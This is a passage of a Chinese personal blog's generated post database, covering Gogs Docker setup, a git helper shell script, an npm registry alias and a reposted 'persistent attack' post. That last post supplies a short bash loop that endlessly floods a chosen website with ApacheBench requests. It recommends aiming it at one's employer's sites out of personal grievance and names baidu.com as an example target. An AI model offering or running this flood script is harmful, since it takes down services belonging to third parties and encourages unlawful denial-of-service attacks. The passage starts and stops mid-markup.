class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Pull image from Docker Hub.</span><br><span class=\"line\">$ docker pull gogs/gogs</span><br><span class=\"line\"></span><br><span class=\"line\"># Create local directory for volume.</span><br><span class=\"line\">$ mkdir -p /var/gogs</span><br><span class=\"line\"></span><br><span class=\"line\"># Use `docker run` for the first time.</span><br><span class=\"line\">$ docker run --name=gogs -p 10022:22 -p 10080:3000 -v /var/gogs:/data gogs/gogs</span><br><span class=\"line\"></span><br><span class=\"line\"># Use `docker start` if you have stopped it.</span><br><span class=\"line\">$ docker start gogs</span><br></pre></td></tr></table></figure>\n<p>配置文件：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">docker run --restart=always --name=gogs -p 3000:3000 -v /var/gogs:/data gogs/gogs</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"4-运行\"><a href=\"#4-运行\" class=\"headerlink\" title=\"4. 运行\"></a>4. 运行</h2><p>“<code>chmod +x gogs.docker</code>“: </p>\n<p>“<code>echo $PATH</code>“: 打印 环境变量</p>\n<p>“<code>./gogs.docker</code>“：启动服务</p>\n<h2 id=\"5-重启服务\"><a href=\"#5-重启服务\" class=\"headerlink\" title=\"5. 重启服务\"></a>5. 重启服务</h2><p><code>docker ps</code>获取<code>CONTAINER ID</code></p>\n<p><code>docker restart [19d724ea6ec9(ID)]</code></p>\n"},{"title":"linux查看端口占用情况","date":"2018-08-10T04:25:49.000Z","_content":"","source":"_posts/Operating System/UnixLike/Linux/linux查看端口占用情况.md","raw":"---\ntitle: linux查看端口占用情况\ndate: 2018-08-10 12:25:49\ntags:\ncategories:\n---\n","slug":"Operating System/UnixLike/Linux/linux查看端口占用情况","published":1,"updated":"2018-09-05T06:33:18.501Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry3b00ffzodvl9dbl058","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"添加自定义shell","date":"2018-05-04T03:34:46.000Z","archives":"shell脚本","_content":"# 添加自定义github.shell\n````\n$ echo $PATH  // 打印 路径\n$ cd /home/LiSC/bin  // 转到第一个路径\n$ mkdir /home/LiSC/bin  // 创建文件夹\n$ vim github.shell  // 创建文件[把shell脚本复制粘贴]\n$ chmod +x github.shell  // 文件权限属性设置 => 用来变更文件或目录的权限\n````\n\n附：shell\n````\n#!/bin/bash\n## Coptyright 2016 The HongJiang Library Authors. All rights reserved.\n## Use of this source code is governed by a Apache-style\n## license that can be found in the LICNESE file.\n##\n## Git(Github.com) Common Client Commands.\n##\n## @authors hjboss <hongjiangproject@gmail.com> 2018-04 $$\n## @version 1.0.0\nGIT=`/usr/bin/which git`\nHOST='git@github.com'\nNAME='hlibs'\nSCRIPT=`basename $0`\n\ncase \"$1\" in\n\t\"add\")\n\t\tif [ $# -lt 2 ] || [ \"$2\" == \"*\" ]; then\n\t\t\t$GIT add --all\n\t\telse\n\t\t\t$GIT add \"$2\"\n\t\tfi\n\t;;\n\n\t\"ci\")\n\t\tif [ $# -lt 2 ]; then\n\t\t\t$GIT commit -a -m \"Initial commit\"\n\t\telse\n\t\t\t$GIT commit -a -m \"$2\"\n\t\tfi\n\t\t$GIT push -u origin master\n\t;;\n\n\t\"co\")\n\t\tif [ $# -lt 2 ]; then\n\t\t\techo \"版本庫名稱不能空值\"\n\t\telif [ $# -eq 2 ]; then\n\t\t\t$GIT clone \"$HOST:$NAME/$2.git\"\n\t\telse\n\t\t\t$GIT clone \"$HOST:$2/$3.git\"\n\t\tfi\n\t;;\n\n\t\"rm\")\n\t\tif [ $# -lt 2 ]; then\n\t\t\techo \"刪除文件名不能空值\"\n\t\t\texit\n\t\tfi\n\t\t$GIT rm \"$2\"\n\t;;\n\n\t\"up\")\n\t\t$GIT pull\n\t;;\n\n\t\"st\")\n\t\t$GIT status\n\t;;\n\n\t\"help\")\n\t\techo \"用法: $SCRIPT <subcommand> [args]\"\n\t\techo \"版本: 1.0.0\"\n\t\techo \"最常用的子命令:\"\n\t\techo \"  add 添加文件内容至索引\"\n\t\techo \"  ci 记录变更到版本库并且更新至github.com\"\n\t\techo \"  co 将给定名称的版本库克隆到一个新目录\"\n\t\techo \"  rm 从工作区和索引中删除文件\"\n\t\techo \"  up 本地分支更新到最新版本\"\n\t\techo \"  st 显示工作区状态\"\n\t;;\n\n\t\"version\")\n\t\techo \"$SCRIPT version 1.0.0\"\n\t;;\n\n\t*)\n\t\techo \"使用$SCRIPT help得到用法\"\n\t;;\nesac\n````\n\n# 自定义NPM脚本\n`sbin & bin 区别` root可以访问 `sbin` 下的脚本\n> /usr/local/sbin/npm.shell\n\n````\n#!/bin/sh\nnpm --registry=https://registry.npm.taobao.org $*\n````\n**`$*`**: 属于 process 环境变量","source":"_posts/Operating System/UnixLike/Linux/添加自定义shell.md","raw":"---\ntitle: 添加自定义shell\ndate: 2018-05-04 11:34:46\ntags: 自定义shell\narchives: shell脚本\ncategories: shell\n---\n# 添加自定义github.shell\n````\n$ echo $PATH  // 打印 路径\n$ cd /home/LiSC/bin  // 转到第一个路径\n$ mkdir /home/LiSC/bin  // 创建文件夹\n$ vim github.shell  // 创建文件[把shell脚本复制粘贴]\n$ chmod +x github.shell  // 文件权限属性设置 => 用来变更文件或目录的权限\n````\n\n附：shell\n````\n#!/bin/bash\n## Coptyright 2016 The HongJiang Library Authors. All rights reserved.\n## Use of this source code is governed by a Apache-style\n## license that can be found in the LICNESE file.\n##\n## Git(Github.com) Common Client Commands.\n##\n## @authors hjboss <hongjiangproject@gmail.com> 2018-04 $$\n## @version 1.0.0\nGIT=`/usr/bin/which git`\nHOST='git@github.com'\nNAME='hlibs'\nSCRIPT=`basename $0`\n\ncase \"$1\" in\n\t\"add\")\n\t\tif [ $# -lt 2 ] || [ \"$2\" == \"*\" ]; then\n\t\t\t$GIT add --all\n\t\telse\n\t\t\t$GIT add \"$2\"\n\t\tfi\n\t;;\n\n\t\"ci\")\n\t\tif [ $# -lt 2 ]; then\n\t\t\t$GIT commit -a -m \"Initial commit\"\n\t\telse\n\t\t\t$GIT commit -a -m \"$2\"\n\t\tfi\n\t\t$GIT push -u origin master\n\t;;\n\n\t\"co\")\n\t\tif [ $# -lt 2 ]; then\n\t\t\techo \"版本庫名稱不能空值\"\n\t\telif [ $# -eq 2 ]; then\n\t\t\t$GIT clone \"$HOST:$NAME/$2.git\"\n\t\telse\n\t\t\t$GIT clone \"$HOST:$2/$3.git\"\n\t\tfi\n\t;;\n\n\t\"rm\")\n\t\tif [ $# -lt 2 ]; then\n\t\t\techo \"刪除文件名不能空值\"\n\t\t\texit\n\t\tfi\n\t\t$GIT rm \"$2\"\n\t;;\n\n\t\"up\")\n\t\t$GIT pull\n\t;;\n\n\t\"st\")\n\t\t$GIT status\n\t;;\n\n\t\"help\")\n\t\techo \"用法: $SCRIPT <subcommand> [args]\"\n\t\techo \"版本: 1.0.0\"\n\t\techo \"最常用的子命令:\"\n\t\techo \"  add 添加文件内容至索引\"\n\t\techo \"  ci 记录变更到版本库并且更新至github.com\"\n\t\techo \"  co 将给定名称的版本库克隆到一个新目录\"\n\t\techo \"  rm 从工作区和索引中删除文件\"\n\t\techo \"  up 本地分支更新到最新版本\"\n\t\techo \"  st 显示工作区状态\"\n\t;;\n\n\t\"version\")\n\t\techo \"$SCRIPT version 1.0.0\"\n\t;;\n\n\t*)\n\t\techo \"使用$SCRIPT help得到用法\"\n\t;;\nesac\n````\n\n# 自定义NPM脚本\n`sbin & bin 区别` root可以访问 `sbin` 下的脚本\n> /usr/local/sbin/npm.shell\n\n````\n#!/bin/sh\nnpm --registry=https://registry.npm.taobao.org $*\n````\n**`$*`**: 属于 process 环境变量","slug":"Operating System/UnixLike/Linux/添加自定义shell","published":1,"updated":"2018-09-05T06:33:18.502Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry3d00fkzodvnxlch8nv","content":"<h1 id=\"添加自定义github-shell\"><a href=\"#添加自定义github-shell\" class=\"headerlink\" title=\"添加自定义github.shell\"></a>添加自定义github.shell</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ echo $PATH  // 打印 路径</span><br><span class=\"line\">$ cd /home/LiSC/bin  // 转到第一个路径</span><br><span class=\"line\">$ mkdir /home/LiSC/bin  // 创建文件夹</span><br><span class=\"line\">$ vim github.shell  // 创建文件[把shell脚本复制粘贴]</span><br><span class=\"line\">$ chmod +x github.shell  // 文件权限属性设置 =&gt; 用来变更文件或目录的权限</span><br></pre></td></tr></table></figure>\n<p>附：shell<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">## Coptyright 2016 The HongJiang Library Authors. All rights reserved.</span><br><span class=\"line\">## Use of this source code is governed by a Apache-style</span><br><span class=\"line\">## license that can be found in the LICNESE file.</span><br><span class=\"line\">##</span><br><span class=\"line\">## Git(Github.com) Common Client Commands.</span><br><span class=\"line\">##</span><br><span class=\"line\">## @authors hjboss &lt;hongjiangproject@gmail.com&gt; 2018-04 $$</span><br><span class=\"line\">## @version 1.0.0</span><br><span class=\"line\">GIT=`/usr/bin/which git`</span><br><span class=\"line\">HOST=&apos;git@github.com&apos;</span><br><span class=\"line\">NAME=&apos;hlibs&apos;</span><br><span class=\"line\">SCRIPT=`basename $0`</span><br><span class=\"line\"></span><br><span class=\"line\">case &quot;$1&quot; in</span><br><span class=\"line\">\t&quot;add&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ] || [ &quot;$2&quot; == &quot;*&quot; ]; then</span><br><span class=\"line\">\t\t\t$GIT add --all</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t\t$GIT add &quot;$2&quot;</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;ci&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ]; then</span><br><span class=\"line\">\t\t\t$GIT commit -a -m &quot;Initial commit&quot;</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t\t$GIT commit -a -m &quot;$2&quot;</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t\t$GIT push -u origin master</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;co&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ]; then</span><br><span class=\"line\">\t\t\techo &quot;版本庫名稱不能空值&quot;</span><br><span class=\"line\">\t\telif [ $# -eq 2 ]; then</span><br><span class=\"line\">\t\t\t$GIT clone &quot;$HOST:$NAME/$2.git&quot;</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t\t$GIT clone &quot;$HOST:$2/$3.git&quot;</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;rm&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ]; then</span><br><span class=\"line\">\t\t\techo &quot;刪除文件名不能空值&quot;</span><br><span class=\"line\">\t\t\texit</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t\t$GIT rm &quot;$2&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;up&quot;)</span><br><span class=\"line\">\t\t$GIT pull</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;st&quot;)</span><br><span class=\"line\">\t\t$GIT status</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;help&quot;)</span><br><span class=\"line\">\t\techo &quot;用法: $SCRIPT &lt;subcommand&gt; [args]&quot;</span><br><span class=\"line\">\t\techo &quot;版本: 1.0.0&quot;</span><br><span class=\"line\">\t\techo &quot;最常用的子命令:&quot;</span><br><span class=\"line\">\t\techo &quot;  add 添加文件内容至索引&quot;</span><br><span class=\"line\">\t\techo &quot;  ci 记录变更到版本库并且更新至github.com&quot;</span><br><span class=\"line\">\t\techo &quot;  co 将给定名称的版本库克隆到一个新目录&quot;</span><br><span class=\"line\">\t\techo &quot;  rm 从工作区和索引中删除文件&quot;</span><br><span class=\"line\">\t\techo &quot;  up 本地分支更新到最新版本&quot;</span><br><span class=\"line\">\t\techo &quot;  st 显示工作区状态&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;version&quot;)</span><br><span class=\"line\">\t\techo &quot;$SCRIPT version 1.0.0&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t*)</span><br><span class=\"line\">\t\techo &quot;使用$SCRIPT help得到用法&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\">esac</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"自定义NPM脚本\"><a href=\"#自定义NPM脚本\" class=\"headerlink\" title=\"自定义NPM脚本\"></a>自定义NPM脚本</h1><p><code>sbin &amp; bin 区别</code> root可以访问 <code>sbin</code> 下的脚本</p>\n<blockquote>\n<p>/usr/local/sbin/npm.shell</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/sh</span><br><span class=\"line\">npm --registry=https://registry.npm.taobao.org $*</span><br></pre></td></tr></table></figure>\n<p><strong><code>$*</code></strong>: 属于 process 环境变量</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"添加自定义github-shell\"><a href=\"#添加自定义github-shell\" class=\"headerlink\" title=\"添加自定义github.shell\"></a>添加自定义github.shell</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ echo $PATH  // 打印 路径</span><br><span class=\"line\">$ cd /home/LiSC/bin  // 转到第一个路径</span><br><span class=\"line\">$ mkdir /home/LiSC/bin  // 创建文件夹</span><br><span class=\"line\">$ vim github.shell  // 创建文件[把shell脚本复制粘贴]</span><br><span class=\"line\">$ chmod +x github.shell  // 文件权限属性设置 =&gt; 用来变更文件或目录的权限</span><br></pre></td></tr></table></figure>\n<p>附：shell<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">## Coptyright 2016 The HongJiang Library Authors. All rights reserved.</span><br><span class=\"line\">## Use of this source code is governed by a Apache-style</span><br><span class=\"line\">## license that can be found in the LICNESE file.</span><br><span class=\"line\">##</span><br><span class=\"line\">## Git(Github.com) Common Client Commands.</span><br><span class=\"line\">##</span><br><span class=\"line\">## @authors hjboss &lt;hongjiangproject@gmail.com&gt; 2018-04 $$</span><br><span class=\"line\">## @version 1.0.0</span><br><span class=\"line\">GIT=`/usr/bin/which git`</span><br><span class=\"line\">HOST=&apos;git@github.com&apos;</span><br><span class=\"line\">NAME=&apos;hlibs&apos;</span><br><span class=\"line\">SCRIPT=`basename $0`</span><br><span class=\"line\"></span><br><span class=\"line\">case &quot;$1&quot; in</span><br><span class=\"line\">\t&quot;add&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ] || [ &quot;$2&quot; == &quot;*&quot; ]; then</span><br><span class=\"line\">\t\t\t$GIT add --all</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t\t$GIT add &quot;$2&quot;</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;ci&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ]; then</span><br><span class=\"line\">\t\t\t$GIT commit -a -m &quot;Initial commit&quot;</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t\t$GIT commit -a -m &quot;$2&quot;</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t\t$GIT push -u origin master</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;co&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ]; then</span><br><span class=\"line\">\t\t\techo &quot;版本庫名稱不能空值&quot;</span><br><span class=\"line\">\t\telif [ $# -eq 2 ]; then</span><br><span class=\"line\">\t\t\t$GIT clone &quot;$HOST:$NAME/$2.git&quot;</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t\t$GIT clone &quot;$HOST:$2/$3.git&quot;</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;rm&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ]; then</span><br><span class=\"line\">\t\t\techo &quot;刪除文件名不能空值&quot;</span><br><span class=\"line\">\t\t\texit</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t\t$GIT rm &quot;$2&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;up&quot;)</span><br><span class=\"line\">\t\t$GIT pull</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;st&quot;)</span><br><span class=\"line\">\t\t$GIT status</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;help&quot;)</span><br><span class=\"line\">\t\techo &quot;用法: $SCRIPT &lt;subcommand&gt; [args]&quot;</span><br><span class=\"line\">\t\techo &quot;版本: 1.0.0&quot;</span><br><span class=\"line\">\t\techo &quot;最常用的子命令:&quot;</span><br><span class=\"line\">\t\techo &quot;  add 添加文件内容至索引&quot;</span><br><span class=\"line\">\t\techo &quot;  ci 记录变更到版本库并且更新至github.com&quot;</span><br><span class=\"line\">\t\techo &quot;  co 将给定名称的版本库克隆到一个新目录&quot;</span><br><span class=\"line\">\t\techo &quot;  rm 从工作区和索引中删除文件&quot;</span><br><span class=\"line\">\t\techo &quot;  up 本地分支更新到最新版本&quot;</span><br><span class=\"line\">\t\techo &quot;  st 显示工作区状态&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;version&quot;)</span><br><span class=\"line\">\t\techo &quot;$SCRIPT version 1.0.0&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t*)</span><br><span class=\"line\">\t\techo &quot;使用$SCRIPT help得到用法&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\">esac</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"自定义NPM脚本\"><a href=\"#自定义NPM脚本\" class=\"headerlink\" title=\"自定义NPM脚本\"></a>自定义NPM脚本</h1><p><code>sbin &amp; bin 区别</code> root可以访问 <code>sbin</code> 下的脚本</p>\n<blockquote>\n<p>/usr/local/sbin/npm.shell</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/sh</span><br><span class=\"line\">npm --registry=https://registry.npm.taobao.org $*</span><br></pre></td></tr></table></figure>\n<p><strong><code>$*</code></strong>: 属于 process 环境变量</p>\n"},{"title":"持续进攻","date":"2018-05-07T08:39:27.000Z","archives":null,"_content":"# [转][BOSS开源软件(一)：黑客帝国之持久进攻](https://user.qzone.qq.com/525150008)\n\n **使用说明：**\\\n（1）该软件属于中华人民共和国的法定危险品，请谨慎使用。\\\n（2）该软件的推荐使用范围仅限于：对公司或上级领导不满，且不便于和他们多度交流时，可使公司相关的网站作为个人情绪的发泄对象。切不可伤害无辜。\\\n（3）声明：切不可把该软件作为凌弱之手段，切不可伤害无辜。\\\n（4）如果您多度使用而进了那个地方，这一切都是您刻苦钻研自学成才之结果，皆与本人无关。\\\n（5）该软件目前只支持Linux操作系统和苹果OSX操作系统，若需要Windows版本的，请自行研发。\\\n（6）软件使用者自感为黑客，且不熟悉Linux或OSX的，官方推荐：您还是早点投胎去吧，上帝会原谅您的过错的！\n\n代码：\\\n(1) 打开Linux终端或OSX终端，新建文件`h.sh` \\\n(2) 编辑文件`h.sh`，并保存。代码内容如下：\n````\n#!/bin/bash\n# 注释：下面变量DOMAIN可以修改成你需要的网站域名 \nDOMAIN=\"http://www.yourdomain.com/\"\nCOUNT=1000\nwhile true\ndo\n    ab -c $COUNT -n  $COUNT $DOMAIN\ndone\n````\n(3) 添加h.sh的执行权限，输入命令：`chmod +x h.sh`\\\n(4) 执行软件，输入命令：`./h.sh`\n\n### 注意事项：\n1. 如果系统提示找不到`ab`命令时，您需要自行安装`ApacheWeb`服务器。\n\n    （1）在如CentOS/Fedora等Linux操作系统，输入命令：sudo yum install httpd\n\n    （2）在如Ubuntu等Linux操作系统，输入命令：sudo apt-get install httpd\n\n    （3）在苹果OSX，只需在官方下载相应的安装包进行安装即可\n\n2. 您修改代码的DOMAIN变量却会不断出现类似于帮助的信息时，请先按Ctrl+C终止当前执行进程，检查DOMAIN格式是否正确。\n\n    例如：我们设置DOMAIN为百度，我们必需写成\n    `http://www.baidu.com/`(注意反斜杠)，而不能`www.baidu.com`或`http://www.baidu.com`\n\n3. 如果您已经满足使用该软件的效果，请及时停止使用，按Ctrl+C终止该软件。\n\n### 总结：\n我们欢迎使用该软件在有限范围内用于发泄个人的不良情绪。\n\n但我们需要再次提示：\n  \n该软件属于中华人民共和国的法定危险品，请谨慎使用。","source":"_posts/Operating System/UnixLike/Linux/持续进攻.md","raw":"---\ntitle: 持续进攻\ndate: 2018-05-07 16:39:27\ntags:\narchives:\ncategories:\n---\n# [转][BOSS开源软件(一)：黑客帝国之持久进攻](https://user.qzone.qq.com/525150008)\n\n **使用说明：**\\\n（1）该软件属于中华人民共和国的法定危险品，请谨慎使用。\\\n（2）该软件的推荐使用范围仅限于：对公司或上级领导不满，且不便于和他们多度交流时，可使公司相关的网站作为个人情绪的发泄对象。切不可伤害无辜。\\\n（3）声明：切不可把该软件作为凌弱之手段，切不可伤害无辜。\\\n（4）如果您多度使用而进了那个地方，这一切都是您刻苦钻研自学成才之结果，皆与本人无关。\\\n（5）该软件目前只支持Linux操作系统和苹果OSX操作系统，若需要Windows版本的，请自行研发。\\\n（6）软件使用者自感为黑客，且不熟悉Linux或OSX的，官方推荐：您还是早点投胎去吧，上帝会原谅您的过错的！\n\n代码：\\\n(1) 打开Linux终端或OSX终端，新建文件`h.sh` \\\n(2) 编辑文件`h.sh`，并保存。代码内容如下：\n````\n#!/bin/bash\n# 注释：下面变量DOMAIN可以修改成你需要的网站域名 \nDOMAIN=\"http://www.yourdomain.com/\"\nCOUNT=1000\nwhile true\ndo\n    ab -c $COUNT -n  $COUNT $DOMAIN\ndone\n````\n(3) 添加h.sh的执行权限，输入命令：`chmod +x h.sh`\\\n(4) 执行软件，输入命令：`./h.sh`\n\n### 注意事项：\n1. 如果系统提示找不到`ab`命令时，您需要自行安装`ApacheWeb`服务器。\n\n    （1）在如CentOS/Fedora等Linux操作系统，输入命令：sudo yum install httpd\n\n    （2）在如Ubuntu等Linux操作系统，输入命令：sudo apt-get install httpd\n\n    （3）在苹果OSX，只需在官方下载相应的安装包进行安装即可\n\n2. 您修改代码的DOMAIN变量却会不断出现类似于帮助的信息时，请先按Ctrl+C终止当前执行进程，检查DOMAIN格式是否正确。\n\n    例如：我们设置DOMAIN为百度，我们必需写成\n    `http://www.baidu.com/`(注意反斜杠)，而不能`www.baidu.com`或`http://www.baidu.com`\n\n3. 如果您已经满足使用该软件的效果，请及时停止使用，按Ctrl+C终止该软件。\n\n### 总结：\n我们欢迎使用该软件在有限范围内用于发泄个人的不良情绪。\n\n但我们需要再次提示：\n  \n该软件属于中华人民共和国的法定危险品，请谨慎使用。","slug":"Operating System/UnixLike/Linux/持续进攻","published":1,"updated":"2018-09-05T06:33:18.501Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry3e00flzodvs123jsdo","content":"<h1 id=\"转-BOSS开源软件-一-：黑客帝国之持久进攻\"><a href=\"#转-BOSS开源软件-一-：黑客帝国之持久进攻\" class=\"headerlink\" title=\"[转]BOSS开源软件(一)：黑客帝国之持久进攻\"></a>[转]<a href=\"https://user.qzone.qq.com/525150008\" target=\"_blank\" rel=\"noopener\">BOSS开源软件(一)：黑客帝国之持久进攻</a></h1><p> 